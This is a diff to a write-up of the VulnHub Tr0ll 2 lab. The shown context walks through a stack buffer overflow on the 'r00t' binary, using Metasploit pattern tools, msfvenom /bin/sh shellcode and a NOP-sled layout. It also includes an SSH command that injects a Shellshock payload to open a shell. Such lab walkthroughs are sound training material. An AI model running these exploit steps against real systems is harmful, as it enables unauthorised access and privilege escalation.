@@ -375,6 +375,8 @@ cd /nothing_to_see_here/choose_wisely/door3
 ```
 
 I tried for many times and found that r00t in door3 is vulnerable to buffer overflow so I will exploit this. (actually it random, when I leave for awhile and come to the target I noticed it change vulnerable r00t file to other door.)
+
+I create pattern string to find buffer size.
 ```
 root@AIRBUS:# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
@@ -400,7 +402,8 @@ Convert pattern to decimal buffer size
 root@AIRBUS:# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969
 [*] Exact match at offset 268
 ```
-Use msfpayload to create payload /bin/sh and escape null byte
+
+Use msfvenom to create payload of /bin/sh and escape null byte
 ```
 root@AIRBUS:/kapi/vulnhub/tr0ll-2# msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
 Found 10 compatible encoders
@@ -419,7 +422,8 @@ buf += "\xea\x54\x32\x5a\x8c"
 ```
 
 Write an exploit. (A*268)(offset of shell)(nop sled)(shellcode)
-Even I found the position of esp was 0xbffffab0 but I could not use this offset as shell position. I have to shift plus or minut a little because when the binary was in debugging the memory was different.
+
+Even I found the position of esp was 0xbffffab0 but I could not use this offset as shell position. I have to increase or reduce offset a little because when the binary was in debugging the memory was different.
 ```
 root@AIRBUS:# ssh -i noob noob@192.168.159.134 '() { :;}; /bin/bash'
 cd /nothing_to_see_here/choose_wisely/door3
